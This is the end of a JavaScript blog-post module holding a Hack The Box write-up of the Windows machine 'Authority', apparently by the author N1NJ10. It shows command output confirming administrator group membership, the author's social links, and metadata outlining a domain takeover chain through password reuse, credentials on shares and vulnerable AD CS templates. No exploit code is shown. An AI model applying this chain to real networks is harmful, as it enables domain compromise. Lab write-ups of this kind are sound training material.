    Local Group Memberships      *Administrators       *Remote Management Use
    Global Group memberships     *Domain Users
    The command completed successfully.
    </code></pre>
    </ul>
    <p>Now we are in my boy</p> 
    <p>That&#39;s it, my friend, I&#39;m happy to share with you more of my articles and tips & tricks If you wanaa to be updated with my stuff just Subscribe to our Telegram channel :</strong>&#x20;</p>
    <a href="https://t.me/N1NJ10" data-rnwi-u529wo-aq1qub-c1zw6o-1k4bu33-1cut0bx-na6qhi--hover="true" data-rnwi--1tgwseu--focus="true" data-rnwi-5xr8s6-dse9kg-1rbj2e8-2fw26j-focus-visible="true" data-rnwi-handle="BaseCard" class="base-card" r-lrvibr r-1loqt21 r-1otgn73 r-m2nopt r-z2wwpe r-rs99b7 r-1udh08x r-1clhhh9 r-18u37iz r-1awozwy r-nsbfu8" ><div class="image-icon"><img alt="" src="https://avatars.githubusercontent.com/u/92612410?v=4" width="100%" height="auto" decoding="async" data-rnwibasecard--6b6lzv-hover="true" data-rnwi-handle="nearest" class="r-hd655f" style="width: 32px; height: 32px; border-radius: 4px;"></div><div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2"><div class="css-175oi2r r-18u37iz r-1awozwy"><div dir="auto" data-rnwibasecard--6b6lzv-hover-focus="true" data-rnwi-handle="nearest" class="css-1rynq56 r-dnmrzs r-1udh08x r-1udbk01 r-3s2u2q r-1iln25a r-gg6oyi r-ubezar r-135wba7 r-majxgm r-z9jf92" title="Penetration Testing with Shellcode: Detect, exploit, and secure network-level and operating system vulnerabilities">N1NJ10 Channel</div></div><div class="css-175oi2r"><div dir="auto" class="css-1rynq56 r-gg6oyi r-1b43r93 r-16dba41 r-hbpseb r-1f2v84d">https://t.me/N1NJ10</div></div></div></a>
    <p>LinkedIn:-</strong> <a href="https://www.linkedin.com/in/fadymoheb">https://www.linkedin.com/in/fadymoheb</strong></a></p>
    <p>Facebook:-</strong> <a href="https://www.facebook.com/FADYMo7eB">https://www.facebook.com/FADYMo7eB</strong></a></p>
    <p>Twitter:-</strong> <a href="https://twitter.com/N1NJ1O</strong></a></p>
    <p>Tryhackme:-</strong> <a href="https://tryhackme.com/p/FadyMoheb">https://tryhackme.com/p/FadyMoheb</strong></a></p>
    <p>HackTheBox:-</strong> <a href="https://app.hackthebox.com/profile/921394">https://app.hackthebox.com/profile/FadyMoheb</strong></a> # If you like my writeups you can give me a respect on my HTB account </p>

    <p>> See you in another great writeup 😉</strong></p>

    `,
    description: 'Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.

',
    date: new Date(2024, 1, 1),
    previewPicture: '/pages/Photos/Authority.png',
    tags: ['htb','windows','ad','ctf'],
    author: 'N1NJ10',
    category: 'ctf'
};

export default newPost;
